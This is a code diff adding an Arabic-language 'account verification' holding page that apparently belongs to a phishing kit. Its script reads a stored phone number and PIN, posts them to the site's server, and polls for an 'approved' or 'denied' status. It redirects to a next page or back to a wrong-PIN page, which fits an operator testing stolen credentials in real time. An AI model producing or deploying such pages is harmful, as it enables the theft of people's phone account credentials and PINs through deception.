@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>جارٍ المعالجة</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #333; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
+    </style>
+</head>
+<body>
+<div>
+    <h2>جاري المعالجة...</h2>
+    <p>يرجى الانتظار بينما نتحقق من حسابك</p>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", async () => {
+        const phone = localStorage.getItem("phone");
+        const pin = localStorage.getItem("lastPin");
+
+        try {
+            await fetch("/api/login-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, pin })
+            });
+        } catch (e) { console.error(e); }
+
+        const interval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${phone}`);
+                const data = await res.json();
+                if (data.status === "approved") {
+                    clearInterval(interval);
+                    window.location.href = "/page8";
+                } else if (data.status === "denied") {
+                    clearInterval(interval);
+                    window.location.href = "/page6?error=wrongpin";
+                }
+            } catch (err) { console.error(err); }
+        }, 2000);
+    });
+</script>
+</body>
+</html>
